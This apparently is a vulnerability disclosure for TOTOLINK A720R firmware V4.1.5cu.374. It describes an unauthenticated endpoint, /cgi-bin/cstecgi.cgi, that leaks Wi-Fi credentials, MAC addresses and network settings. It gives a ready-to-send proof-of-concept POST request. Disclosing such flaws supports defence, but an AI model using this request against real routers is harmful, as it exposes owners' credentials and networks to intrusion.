# Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/203/ids/36.html

# Affected version

V4.1.5cu.374

# Vulnerability details

The TOTOLINK A720R V4.1.5cu.374 firmware contains an unauthenticated sensitive information disclosure vulnerability. An attacker can exploit this flaw by sending a crafted POST request with the parameter `{"topicurl":"getSysStatusCfg"}` to `/cgi-bin/cstecgi.cgi`, allowing unauthorized access to sensitive system information such as firmware version, MAC addresses, Wi-Fi credentials, LAN/WAN IP configurations, and other critical device details. This could lead to unauthorized network access or further exploitation.

# Poc

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.140.79
Content-Length: 30
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.140.79
Referer: http://192.168.140.79/basic/index.html?time=1745238634622
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

{"topicurl":"getSysStatusCfg"}
```

![图 0](img/e71eeaeef74cd0b3497d8e6918541bd5bcc6e360ab38deed5fcc0efaace2b53e.png)  

